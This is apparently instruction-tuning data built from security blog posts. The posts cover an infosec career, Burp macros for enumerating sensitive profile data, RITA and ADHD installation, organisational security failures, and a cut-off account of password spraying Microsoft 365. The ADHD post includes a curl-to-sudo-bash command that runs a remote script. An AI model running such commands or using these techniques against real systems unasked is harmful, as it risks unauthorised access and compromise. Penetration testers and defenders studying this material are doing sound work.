        "output": "Derek Banks More than occasionally I am asked how to get into Information Security as a profession As attacks and breaches continue to escalate in frequency the demand rises for information security talent I also frequently hear from those in a hiring role that it is hard to find people with the right skill set So how does one land that job in a field that by some counts will have shortage of 1.5 million workers by the end of the decade The answer is to develop good hacking kung fu When most hear the words kung fu they think of Chinese martial arts This not entirely inaccurate from a Western perspective but the meaning in Chinese is closer to the result of time and effort One must invest the time to learn the technical skills involved in attacking and defending computer systems and networks to develop their hacking kung fu in order to get that Infosec job that previously seemed out of reach Just like learning the martial arts getting started can be painful and the right mindset is key to becoming successful It is also necessary to find a mentor and practice practice and practice some more It may be easier for some for example a systems administrator already in IT but anyone can learn the necessary skills with the appropriate investment of time.First and most importantly you must have a desire and a passion to understand how things work You have to become someone that wants to understand how a particular computer system functions and once you figure it out determine if the workings of that system can be used in ways that the original designers did not intend In my opinion this is the essence of being a hacker and you need to always be in this mindset Martial arts students learn base moves that are then built upon to create true martial skill Similarly in Infosec you need to learn base technical skills that are then used to understand a system and determine how an attacker could potentially take advantage of it Infosec Basic Building Blocks -Operating Systems-Networking-Programming The first foundation is to understand how operating systems work You will want to learn both Linux and Windows Linux because of the tools available and flexibility Windows because when you land that awesome IT security job the majority of the computers in the organization will be most likely be Windows based The best way to learn Linux is to dive right in and install it and start using it Getting a book to help you along is a good idea but nothing will beat the hands on experience of tinkering with it For most the easiest way will be to install Linux as a Virtual Machine on their existing system which is convenient as you will want to conversant in the language of virtualization in addition to the operating system fundamentals The next key building block is is learning networking specifically TCP IP the underlying protocol used for nearly all Internet communication Depending on your level of knowledge you should start out with a general concept book such as Network type training material Next move on to more advanced material like TCP IP Illustrated Knowing TCP IP is critical almost everything you deal with will interface with it Finally you will need to know scripting and programming to some degree Your level of exposure to programming concepts will determine what you do here There are many languages to choose from However the easiest to get started with is probably Python Knowing bash scripting in Linux will also be very helpful While you will most likely not be developing software for general use there will be many times where you will need to automate something or develop a simple tool to accomplish a task Becoming comfortable in one or more languages should be a goal but know that it will not happen overnight This can also end up being a significant investment of time in your quest for good hacking kung fu Also create a Twitter account and go follow a bunch of folks in the security community You will learn about things days and weeks before the information hits news sites You will see sites and blog posts that you would have never found by just searching the Internet And even if you just mostly lurk you will become part of a community that will help you along in your quest for new skills and be a good first step to find someone that will help mentor you Realize that this will not be a one-week training course you sign up and pay for this is a life-long endeavor Once you get further down the road just like different styles of kung fu you will learn that there are subsets to IT Security that you can further specialize in such as forensics malware analysis intrusion detection or penetration testing and more and each have their own detailed body of knowledge It is an exciting journey that will be life changing and rewarding You will learn new things all of the time build upon those and gain the hacking kung fu skills necessary to obtain and excel in an information security career"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using Simple Burp Macros to Automate Testing</title>\n<taxonomies>Author, David Fletcher, Red Team, Red Team Tools, Web App, Automated Testing, Burp Macros</taxonomies>\n<creation_date>Wed, 23 Dec 2015 21:53:58 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Recently while assessing a web application I noticed content on one of the pages that appeared to be derived from sensitive information stored within the site's user profiles To evaluate this functionality and illustrate the potential for sensitive information leakage I needed to Enumerate the values on my profile page to create a concrete association between the sensitive and derived values Collect and map the sensitive information within the public user profile directory to show that a direct correlation could be easily made During testing I tried to assess the functionality using the default capabilities of Burp Intruder but because of the way the changes were being reflected I couldn't easily enumerate the values This was largely due to the relationship between the profile update page and the content page When the profile was updated the content would be displayed in a totally separate part of the application By default Burp Intruder will alter content in identified positions in a request and analyze the resulting response optionally following a redirect when instructed to do so This wasn't going to be enough to collect the information I was targeting In hindsight I could have accomplished this task by scripting the request response and redirect outside of Burp However I was determined to figure out how I could replicate this functionality with the web application tester's tool of choice Anyway why NOT learn how to use the tools you have available to you in a more effective manner Enter the Burp Macro feature Burp Macros allow you to arbitrarily perform a set of actions based on a Session Handling Rule that can be tied to any of the other integrated tools that Burp boasts In this case we want to Submit a request from Burp Intruder to update the user's profile Check to make sure that the update results in an HTTP 200 status code Perform a subsequent request to the target page with the derived content Send the resulting response to Burp Intruder Analyze the results extracting the target information from the page This same scenario could be applied to other operations like discovery of stored cross-site scripting vulnerabilities XSS Extending the functionality macros have the ability to transform response data generated as a result of a request which could prove useful in analyzing multi-step functionality such as site registration features To illustrate the concept a simple site has been mocked up to include equivalent functionality A user profile edit page is used to submit the user's birthday to the application A corresponding user profile view page is used to display the derived information Both pages can be seen in the graphics below User Profile Update Page User Profile View Page We will use the Burp Macro feature to resolve this derived information to the sensitive information in the user's profile To find the macro feature of Burp you need to navigate to the Options tab then select the Sessions tab Burp macro functionality is found under Options Session The resulting form includes two features that we'll be using to extract the information we want First we need to define a macro that will process our form submissions and cause the subsequent request to be fired Second we need to define a session handling rule to cause the macro to fire based on our Burp Intruder Attack To add the macro scroll to the bottom of the form and click the Add button in the Macro dialog to add a new macro Adding a Burp Macro The history window will appear so an appropriate request can be selected The selected request will fire each time the macro is executed For our sample site when a profile update is fired by Burp Intruder we wish to fetch the profile view page and analyze the response Therefore we select a call to the ProfileView.aspx page Burp Macro Request Selection With this simple example that's all we really need to do besides naming our macro The completed macro form can be seen below Provide a description and click OK to complete the process Completed Burp Macro Form Note The macro properties can include multiple requests and responses which pass parameters from one form to the next and perform intermediate transformations This can be useful in completing multi-step processes where you may only want to inject content on the first form and derive responses based on intermediate responses Now that our macro is complete we need to create a session rule to execute the macro when it sees a request that matches our criteria At the top of the Options Sessions page we can find the Session Handling Rules dialogue box Click Add to create a new Session Handling Rule Above Adding a Session Handling Rule The Session Handling Rule Editor will appear and the Details tab will be selected by default Give the handling rule a name and begin adding rule actions Session Handling Rule Editor Multiple rules can be added to perform several actions in sequence For our purposes we only want to execute our macro and we want to do so after our Burp Intruder request has been processed Click the Add button and select the Run a post-request macro option Adding a Post-Request Macro The Session Handling Action Editor dialog will appear Select the macro that you created to launch the target page deselect the Update the first macro Option and ensure that the option The final response from the macro is selected under Pass back to the invoking tool Since we are not processing any parameters in our macro this is unnecessary Selecting Session Handling Actions Click OK to save the Rule Action and then select the Scope tab of the Session Handling Rule Editor dialog This allows us to specify the tools URLs and parameters to which this Session Handling Rule applies For this example we will only be using Burp Intruder so we can safely deselect the other tools We set the URL Scope to the suite scope we should have already restricted our scope to the target site Finally we don't need to specify parameter scope since we'll be processing specific parameters with Burp Intruder Click OK to save this Session Handling Rule and our macro setup is complete Setting Session Handling Scope With the session handling rule and macro complete we can test our configuration out using Burp Intruder First select the Proxy HTTP History tab to select the base request that we want to manipulate On our example site we're looking for the ProfileEdit.aspx page with post parameters included Within the request we should see the parameters that we wish to manipulate ddlDay ddlMonth and ddlYear Selecting the Target Request Once an acceptable request has been identified send the entry to Burp Intruder Simply right-click on the item and select the Send to Intruder option Send Request to Intruder Select the Intruder Positions tab to configure the appropriate payload positions Ensure that only the parameters that Intruder will manipulate are selected For this example only the day and month columns are significant in producing unique output Since there are multiple payload positions and multiple payload lengths we need to select the Cluster Bomb attack type Cluster Bomb accepts multiple payloads and will iterate through all permutations of the payload combinations Since we want multiple payloads we cannot select the Sniper or Battering Ram attacks Likewise since there isn't a one-to-one relationship between day and month we shouldn't select Pitchfork The completed payload positions form can be seen below Intruder Cluster Bomb Attack Setup With appropriate payload positions selected the actual payloads must be defined In this case we need simple integers to represent the day and month respectively Setup for each payload position can be seen below We aren't concerned with error handling for varying numbers of days in the month We will simply ignore any error output from the application Payload Setup for Day of Month Payload Setup for Month of Year Finally we can finish our attack setup by setting up Burp Intruder's options Since each of these requests must be completed sequentially we cannot take advantage of multi-threading This means that Number of Threads must be adjusted to be one Intruder Attack Options Request Engine Settings We also want to see our enumerated values in the results pane As a result we need to set up a Grep Extract rule Select the Extract the following items from responses check box and click the Add button to add an extract rule Add Grep Extract Rule This step is somewhat tricky Burp Intruder expects that we'll find the content we wish to extract within the response that was forwarded with the request that we are manipulating As a result of our macro we will receive a completely different response Therefore we can't use the built-in tools for identifying the extract location It helps to either have the HTTP History or another Intruder session with our profile view request loaded Return to the Proxy HTTP History tab a send one of the requests for ProfileView.aspx to Burp Intruder Send ProfileVeiw.aspx Request to Intruder Once this request has been sent to Intruder select the Intruder Options tab scroll down to Grep Extract option and click the Add button Now we are working with the request we expect to receive in our original Intruder Attack Select the text you are interested in matching in this case it could be the color identified in the text or in the inline style Burp will create unique matching expressions for finding this text location Copy each expression out to a text file so that it can be input into the correct Grep Extract form The Grep Extract form from ProfileView.aspx and the completed Grep Extract form from our real attack can both be seen below Source Grep Extract Form Target Grep Extract Form All of the other Burp Intruder options can be left with their default values Now with our setup complete the only thing left to do is launch our attack Click the Start Attack button and observe the details in the Intruder Attack window The output below identifies the day of the month Payload1 month of the year Payload2 and corresponding value lblColorName This data can now be used as a lookup table by using the Save Results Table option Enumerated Sensitive Data Relationship Using another Intruder Attack the public profiles of site users can be viewed and a subsequent Grep Match or Grep Extract can be used to identify the day and month of their birthday Hopefully this post has illustrated the simple power of the Burp Macro While this example could have been executed equally well using a script we now have the benefit of a Burp State file to accompany our methodology description In addition this introduction to Burp Macros should get you thinking about how this feature can be used to perform more advanced attacks that involve passing parameters from one stage to the next"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>RITA Quick Start Tutorial - Part 1</title>\n<taxonomies>Blue Team, Blue Team Tools, bro, elasticsearch, kibana, RITA, RITA guide, RITA Quick Start</taxonomies>\n<creation_date>Thu, 31 Mar 2016 19:41:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joe Lillo embed outu.be 3sZwJz02-jQ embed Commands Info Tutorial dependencies sudo apt-get install git Elasticsearch and Kibana sudo add-apt-repository -y ppa webupd8team java sudo apt-get update sudo apt-get -y install oracle-java8-installer mkdir rita_ws cd rita_ws wget ownload.elasticsearch.org elasticsearch release org elasticsearch distribution tar elasticsearch 2.2.1 elasticsearch-2.2.1.tar.gz wget ownload.elastic.co kibana kibana kibana-4.4.2-linux-x64.tar.gz tar -zxvf kibana-4.4.2-linux-x64.tar.gz tar -zxvf elasticsearch-2.2.1.tar.gz cd elasticsearch-2.2.1 bin elasticsearch new terminal with ctrl-shift-t cd rita_ws kibana-4.4.2-linux-x64 kibana Check if Kibana is running in browser localhost 5601 Check if elasticsearch is running in browser localhost 9200 Bro Dependencies sudo apt-get install cmake make gcc g flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev libnuma-dev ethtool libcurl4-openssl-dev cd rita_ws git clone ithub.com actor-framework actor-framework.git cd actor-framework configure make sudo make install cd Download Bro git clone --recursive ithub.com bro bro.git Download RITA git clone -b bro_branch ithub.com blackhillsinfosec RITA.git Patch bro cp RITA bro_patch.patch bro cd bro patch -p1 -i patchfile Build Install Bro configure --prefix usr local bro make sudo make install cd aux plugins elasticsearch configure make sudo make install Configure Bro cd usr local bro ifconfig sudo gedit etc node.cfg sudo sh -c echo n load Bro ElasticSearch logs-to-elasticsearch.bro usr local bro share bro site local.bro Run Bro cd usr local bro bin sudo broctl deploy To stop bro sudo broctl stop Get list of indices from elasticsearch in browser localhost 9200 _cat indices?v Bro source code patches Original patches were found here ithub.com danielguerra69 bro-debian-elasticsearch The patch file used in this tutorial has a few additional changes to customize it for use with RITA"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Installing the Newest Active Defense Harbinger Distribution</title>\n<taxonomies>Blue Team, Blue Team Tools, ADHD, setup, tools, VM</taxonomies>\n<creation_date>Mon, 22 Aug 2016 16:24:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Alex King Hey all I'm a temp intern just over the summer here I spent a while working on the new Active Defense Harbinger Distribution ADHD release so I'm going to do a quick walk-through on how to set it up for you to play with This version of ADHD is distributed differently than before Instead of downloading a huge .iso file you instead run a command in the prompt and all the tools will be installed on your Linux machine For this guide I'll be running a 64 bit ubuntu VM available here in VMware workstation player a free product that can be downloaded here Just follow the setup instructions for VMWare player and you're ready to set up your VM So making our ubuntu VM Open up VMware and go to player file New Virtual Machine You're faced with a page of options for where the virtual machine comes from Choose Installer Disk Image File iso and select the iso you downloaded earlier Then continue with next You are now confronted with an account creation page Fill it in with whatever username and password you choose I'll use the credentials of the old ADHD The next page allows you to name your VM Choose whatever you like and save it where you wish Next select how much space to allocate for the virtual machine's disk and how it's stored I just stuck with the defaults Now you should be on an overview of the settings you've chosen However we're not done yet Click on customize hardware to take care of a few more things You're welcome to play around with the other settings but the big thing that needs taken care of is under the Network Adapter section Once you're there select the bridged radio button to make sure your machine gets its own IP Finish up in this menu and then return to the overview Leave Power on this virtual machine after creation checked for convenience then click finish It'll take a while as it sets up our new VM but when it finishes you'll be confronted with a login prompt Log in with the password you chose earlier Now you're ready to install the ADHD tools Open up a command prompt right-click on the desktop then open terminal and run the following command curl -sL aw.githubusercontent.com adhdproject buildkit master adhd-install.sh sudo bash -s Note There is a newer command to run Please check the readme for the latest install command After a while of downloading and installing tools it will finish and you're done The ADHD toolkit is installed on your VM To get started using the tools head over to ithub.com adhdproject adhdproject.github.io blob master index.md for documentation Best of luck Interested in viewing the source for ADHD Check out the github at ithub.com adhdproject"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Top Signs Your Org Is Failing at Security</title>\n<taxonomies>Informational</taxonomies>\n<creation_date></creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "1ijax aka The Security Viking Just when you think the drum has been beaten loudly enough for long enough a quick survey of organizations across the spectrum will find many companies still just don't get it This list is mostly seen in small to mid size organizations but sometimes even the big shops make these mistakes If you're an executive or member of management and you're having trouble getting a security program going or you really have no clue if you have an effective program read on If you're a Security Pro that feels something isn't right at your organization and every step forward is met with one or more steps backward in your program there's a good chance that organization is systematically failing 1 Management Has No Clear Idea What Security Is This is a pretty big one any sign mentioned below is a symptom of this problem We need to discuss and Management needs to understand so we can be ready to tackle everything else on this list What is the purpose of Security If the first answer that came to your head was duh...protect the company I can't fault you for thinking that but I'm going to tell you it's wrong It is actually the executives in any organization whose job it is to protect the company not the rank and file members of Security So what is Security's job I'm not going to bore you with some acronym that needs to be remembered at a very high level it is two simple things Well it sounds simple but anyone that studies game theory will tell you that the simpler the rules the more complex the game Advise upper management of the threats the organization is facing Oversight of the program upper management has tasked to counter those threats That's it Some Security folks may be screaming at the screen when I say this Who's this Viking guy Security is way more complicated than that and I go home each day and tell myself how proud I am that I protected that company Sure we use all sorts of processes methods and tools for for our security programs and to tease out what the threats are where they come from and what's the likelihood Things like vulnerability management vendor management programs compliance programs red team exercises architectural project reviews Incident response forensics teams Identity and Access management policy creation review code reviews and sometimes just using common sense and throwing a bunch of ideas up on a whiteboard At the end of the day all of those things are just details that support our mission of Advising and Overseeing I did say simple rules make complex games Companies that fail to recognize this usually fail hard They are easy to identify by the lack of any form of strategy and oh boy just wait to see how they respond to a breach...welcome to the shitshow Often times Executives will sound clueless when trying to describe the kind of program they have A perfect example of this I worked at a multi-billion dollar company that recently had doubled in size and during a town hall meeting with the CEO and COO I asked a simple question that went something like this With the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO I knew the response would not be perfect but I wasn't asking them if they had a CISO in mind I was just simply asking if the discussion had started In a way I was testing them to see how the top would respond The questions were being filtered by the head of HR and submitted via email The first sign something was wrong was when the Executive VP head of HR asked back what is a CISO we'll take this moment to pause and allow the security guys to finish laughing Ok the world is full of acronyms and not everybody can pull from memory every acronym they have heard so I let this go and simply explained what those terms were and expanded on my question a little bit to give it more context A couple of minutes pass and the CEO says we have a question With the increase in size and the multiple verticals we are in has anyone started discussions around appointing a CISO or CSO ...great I made it passed the filter What happened next made me wish I had never asked The CEO responded I think we have people that are responsible for that so no next question Did I expect Executives to tip their hand and detail how they are strategically building the Security team to the whole world no but at least a half ass attempt to sound like the thought of Security had crossed their mind would have been nice You know something like What a great question we realize doing business in today's technological world is fraught with many perils and that our expansion has added pressure to many teams including Security I agree now may be a good time for us to review how we are structured to meet those challenges for the future...next question If you're going to feed me bullshit at least pretend to care Instead we got an answer that clearly came from an Executive that didn't get it and had been insulated by many layers from Security Right around that time when I asked the question they moved the head of InfoSec another layer lower than the CIO and started the destruction of that team Which brings us to our next point Improper reporting structure To report to the CIO or not report to the CIO is NOT the question Many pundits have gone back and forth over the years around the question where does infosec report to As the grip of technology has deepened it has often become the practice to shuffle these teams under the CIO The problem with this approach at the risk of oversimplifying things IT exists to serve the technological wants and dreams of the business while the Security's practitioners job advice and oversight gasp sometimes has us telling people no No is an impossible word for the CIO they won't be CIO for long if they use that word They can say Yes but yes but we need more money yes but we need more headcount...etc However can you imagine a CIO saying No we can't build that app you want to better engage our customers and make more money Neither can I To make matters worse so many orgs have CIO's that are new to the game freshly advanced from a director role Typically that director came from a Dev team the IT team that interfaces the most with the wants and desires of the business...go figure and now they have the additional responsibility of Security Don't get me wrong I love the dev guys and the cats riding unicorns while jumping rainbows and shooting ak-47's that they create App security initiatives typically fail because of InfoSec not the dev guys story for another post Anyways that CIO that just got stuck with Security quickly becomes a filter stifling our purpose of Advice and Oversight Hey they are still trying to get their bearings guiding the tech ship and some asshole that fancies himself a Viking keeps telling the dev guys they can't use TLS 1.0 God forbid if that inexperienced CIO shuffles security under another layer of IT management Try it if you really want to see the wheels fall off To be fair to the CIO Security Management doesn't simply say No either We are in the Risk Mitigation business where battles are chosen carefully and political capital is stored for use at a later date Always have a third option more palatable than nothing and be prepared to say No but a lot CISO's that stonewall the business don't remain CISO's for long either Some circles of thought have recently advised that companies have it all wrong and the way forward is IT should actually report to a CISO This is an interesting thought but we still end up with someone that has two roles that can sometimes compromise each other Let's imagine quickly that CISO that has both Security and IT when the chips are down and that person's job is on the line are they going to tell the business what it wants to hear or what it needs to hear If you know a way to do both and be effective at both at the same time please contact me and share your godlike knowledge Who should we report to then Of course this debate has been around since the beginning as well Some say CFO some COO Chief General Counsel...etc I'm going to simplify the whole thing and tell you now that they are all right I'll give you a hint remember the simple purpose of Security Reporting structure directly impacts 1 Advise upper management of the threats the organization is facing Oversight of the program upper management has tasked to counter those threats In order for Security to fulfill its purpose it MUST report directly to a member of the Executive Leadership Team Dotted lines do not work here and anything less is just pretending to care about Security The vertical your company is in may dictate which member of the ELT that is If you're a manufacturer with strong ties to the DoD it may make sense for the COO to hold this billet If you're a bank that is heavily regulated it may make sense for the CFO to have this billet Maybe your org is heavily influenced by legal concerns and the Chief General Counsel is the right person Maybe just maybe the CIO is a member of the ELT and then it makes sense for Security to report to the CIO At the end of the day though it really doesn't matter which C suite person you report to so long as that person has a seat at the table This is the only way to ensure that we aren't playing a game of telephone when millions of customer records and millions of dollars are on the line Policies not owned by executives You would think that this one would be obvious unfortunately this is not always the case I worked at a shop once where the CIO insisted they get to review policies we proposed before legel did Of course Security reported to that CIO so many of our works were met with all sorts of stonewalling and outright watering down The phrase of the day was we need to keep these close so we can remain fluid and adaptable to the business ...blah blah blah Basically they liked being in control of the Security policy so it could be changed as needed to enable saying yes to the business without adding to the workload Remember IT can't say no Drawing from our expanded knowledge of the simple purpose of Security might be a theme here this problem directly impacts Security's ability to provide oversight Executive Leadership MUST own the directives that dictate the direction the Security program is running Policies are the rules by which all employees must operate Without Executive sign off any manager of equal or greater rank then the top Infosec manager can simply interpret what that policy means as they see fit Yes Security gets that there is a difference between attainable and aspirational policies We might advise against it we might ask but shouldn't we aspire to being more secure We wouldn't be good advisors if we simply bent in the direction the wind blew but we also get that policies that you cannot hope to meet are unworkable for everyone involved This is why we need the ELT you know the folks responsible for protecting the company to weigh these decisions carefully and agree on the direction forward Everything we do every process every wall we build is a direct result of Policy Only when the ELT owns and feels comfortable defending these tough decisions can Security effectively move forward If you haven't caught on yet most of the the signs of a failing InfoSec program come directly from Upper Management's lack of engagement Back while studying for a certain cert because it seemed to be the popular thing to do I had the privilege to get some training from Shon Harris Some of you might recall she wrote a really popular study guide I'm quoting from memory so this is probably off the mark she essentially said If Security at your Org does not directly report to the ELT and the ELT or board doesn't sign off on policy you will not succeed If that Org is unwilling to change this you need to run away and don't look back Sorry if I butchered this quote RIP Shon Harris...fuck cancer Security has no idea what the purpose of security is This next one made me laugh as I typed it but sadly this is becoming more and more true Simply put security resources continue to get stretched thin and there are a whole lot of folks with only a couple years experience running around with Sr titles now In my day I know at 42 I'm an old curmudgeon in the industry I had to work 8 years before I got a Senior title It's no secret that many of the rank and file people in Security have at one time or another worked in IT This is nothing new good security handlers have been recruiting from the ranks of IT ever since technology was used anywhere During the web explosion of the 90's and 2000's many of us myself included started out as Network or Infrastructure Engineers building and managing the security tools of the day As those tools become more complex Security teams struggled to operationalize them so it made sense that we would jump over In recent years though as more and more companies became security aware or at least aware-ish the gap in qualified individuals has helped bring on some of the problems we have hiring today Insert lame sports analogy about too many expansion teams and not enough top college talent here Double digit negative unemployment numbers has led to an influx of IT folks managers and engineers jumping ship and grabbing at the chance to get into this field Nothing wrong with that we love to have you please send more developers and dev ops guys this way However what used to be a slow trickle of highly qualified IT people learning the ropes from knowledgeable Security staff has quickly become the blind leading the blind So what gives At a high level the problem is simple IT's job is give the organization the technology it needs to conduct business Securities job is to advise the company what the risks are Their is a subtle difference here in the approach to technology that result in some not so subtle differences in the way we approach our jobs The new guys haven't been around long enough to truly know and live that subtle difference The gaps in Security knowledge are felt hardest at the management tier and the results can be disastrous Newly minted IT managers in Security will often times filter or even completely withhold the results of an honest attempt to evaluate the company's readiness level This natural reaction towards not wanting to look bad to senior management is a glaring violation of the purpose of Security I've personally heard things like There's too much red no way management will take us seriously or I can't give them this it makes us look really bad and worse I need you look closely and see if you can change of few of those things The place to politicise a report is not in the findings it is in your management response I get it Senior management doesn't want to constantly hear about how bad things were or are and you should not get into the habit of using FUD to get your program going Nobody is asking you to wear a tinfoil hat and scream that the sky is falling but when you shirk your duty to advise you are missing your chance to show them how they can get better This is your time to shine and sell a short and long term strategic vision on how the organization can fix these issues and improve itself in the process Isn't that what you were hired to do advise and provide oversight As a manager don't you agree that your usefulness to upper management is your ability to provide a vision for the future and then execute on that vision Then why would you deprive yourself that opportunity Revolving door of Security staff Do people seem to come and go Do most of the analysts and engineers on your team have less than 5 years with the company Does your program seem to be on track for a couple of years and then everyone seems to vanish overnight If you answered yes to any of these then you've got a problem Your staff at one point or another has asked themselves if they can just hang on and put up with things hoping they'll get better With some regions reporting unemployment numbers as low -16 in the InfoSec fields your staff will quickly learn they don't have to wait for you to figure it out High turnover can happen for many reasons and yes more money in a hot market can be a factor but never let yourself believe that's the primary reason they left People in this field don't usually leave the role they leave the company and the managers that run it So how do we fix it Assuming the problem isn't a micromanaging jerk in lower management you first need to understand the type of staff that became Security folks in the first place They absolutely read between all the lines These are the people that crawl through all your systems and pick apart every nuance looking for threats to your organization do you not think they are reading your every move and weighing your words They know when they are being talked down too they know when management is not taking Security seriously If you don't care then why should they These folks especially on the defense side are under a constant stream of new threats They often times stay up at night just learning about the latest and greatest problems in the world They live breathe and eat from the seedy underbelly of the internet and many of them do take protecting the company personally Even we we know we shouldn't we still care at some level Appreciation for the work security does is helpful but straight talk goes a long way Be honest about your shortcomings as a company don't try to wash over them with some pretty facade We have highly attuned bullshit meters Frank discussions about those issues is like taking the first step in a 12 step program Following through with the suggestions Security gives you rather than shrugging them off like a politician that just wants to say the right thing goes a long way This signals to your security staff that the org ready to at least try to fix things and can have a huge impact on moral Now you're talking the talk how do we walk it Three words....Security Staffing Standard Actually outlining in a document how you plan to address staffing levels for this important resource signals to the org and more importantly to the security staff you can't seem to keep that you mean business This also helps you address the problem management has quantifying why when it comes time to ask for headcount No two companies will have the same staffing needs and nobody has come up with the perfect formula for what is exactly the number security staff you need Personally when it comes to the number folks in Security technology I like to use the ratio of IT measure Various studies done have shown orgs range from 3-11 of IT staff are Security staff If you remove the outliers you end up with a range of 6-8 Do you have 200 folks in IT then you should have roughly 12-16 Security engineers and analysts It feels about right and gives management a target that can be managed to I should note this number doesn't typically include management and the verticals your org is in can impact the number Manufacturing tends to be on the lower end while Government Banking tend to be higher Adjust accordingly and be prepared to adapt and change that Standard as the environments you operate in change Strong word of caution...Do not fall into the tool trap Buying a product does NOT replace a headcount in fact it may increase the need due to the specialty nature of managing that tool not to mention the increased findings that can result with a tool that puts your environment under a stronger microscope Security is filled with tools and companies promising big ROI if you buy them just remember that these tools are no different from hammers Hammers don't swing themselves you still need a carpenter to swing the hammer Security operates like a seperate IT dept Speaking of tools all the wonderful tools Firewalls AV IPS CCM DLP SIEM IAM SPAM filters WAFs Web proxies and on and on shiny devices that make server racks look so pretty Does your company make someone with the word Security in their title build and maintain any device that says Security in its description If yes then there is a good chance you don't understand the root purpose of security and you are wasting a resource It's not entirely your fault striking a balance between Security ownership and Security oversight gets further complicated by the fact that a large number of Security Engineers come from IT Contrary to popular belief you do not need a Security title to create ACLs on some fancy Next Gen device Virtualized with AI in the cloud now with karate chopping action I heard a rumor network guys actually know how to you know network things Every hardware or virtual device listed above has network ports operating systems some agent for a host or a method of monitoring a network These are all things that IT builds and distributes every day and doesn't require a Security title Building the policies and the operations around those devices is where the real security magic happens A perfect example I once worked at a company that insisted Security manage the Antivirus solution from top to bottom This meant every patch every hardware swap out every OS compatibility issue every end user question...etc was handled by the same staff responsible for sifting through 1000's of alerts to potential incidents Not only were we burning through a half a person every day to manage this it was on a product that is questionable in its ability to provide any Security discussion for another day Given our thin staffing levels this directly took away from our time reviewing actual incidents Did anything get through that day Don't know didn't have time to look at all the logs Ask yourself if sitting on the phone arguing with tier 1 tech support that won't get off of their script and insists on redoing your troubleshooting steps i mean seriously did they even read the ticket you put in is really helping you meet the purpose of Security There are always going to be tools that it just makes sense if Security Engineering owns the whole thing Some of the tools that we use are a risk to the Org just by the simple fact that you have access to it Limit your engineering teams to those tools as much as you can because I guarantee in a month that tier 1 support guy you were facepalming too will be the next Sr Security Engineer you'll be training in My company has all these problems now what If you"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Breaching the Cloud</title>\n<taxonomies>Informational</taxonomies>\n<creation_date></creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Note This article was included in the Choose Wisely issue of our PROMPT zine It has since been reviewed by the author with minor changes to keep the subject matter up-to-date Flashback to only 10 years and you would see a drastic change in how companies manage their computing resources Chilled datacenters in dark corners of office buildings housed critical infrastructure to protect it from external threat actors Visualizing where your crown jewels are and how to get to them was a lot easier back then Most orgs would take a tower defense approach to protect sensitive data and critical assets on-premises behind a firewall This has changed The cloud has enabled businesses to grow in ways they could not before Instead of employees connecting to an on-prem network with VPN to use things like email intranet sites and perform daily tasks they are now leveraging productivity suites that are 100 cloud-based Instead of running a physical server in a datacenter that same server is now running on a virtual instance in the cloud Instead of storing large databases or files on physical hard drives that data is now being stored in cloud-based storage buckets Instead of defending one tower organizations now have multiple towers to defend that are spread across the globe using a cloud provider's infrastructure and can be accessed in many ways via public application programming interface API As organizations have evolved how they run their infrastructure so too have our penetration testing methodologies evolved When it comes to initial access phishing has been king for many years A close second to that would be password-based attacks Both of these attacks look different now due to cloud usage I used to focus my efforts on finding an externally-exposed Outlook Web Access OWA server as this was a very common webmail tool used by many organizations OWA along with VPNs and other externally-exposed authentication portals that leveraged Active Directory-based authentication were prime targets for password spraying Now that focus has shifted towards cloud-based services such as Microsoft 365 Microsoft 365 has changed the way that many businesses manage email This in effect means that instead of targeting an on-prem OWA server we are now targeting Microsoft 365 services directly Getting access to an employee's Microsoft 365 account typically means access to not only email Outlook but also SharePoint Teams OneDrive and more I was on a red team engagement for a large financial institution where due to some cloud-based misconfigurations I was able to remotely compromise their network After successfully password spraying one of their employees at the Microsoft 365 Outlook portal I found they had Multi-Factor Authentication MFA enabled on the account This prevented me from logging into the user's email with a web browser As mentioned earlier most cloud services have additional APIs Azure has one called the Microsoft Graph API I tried 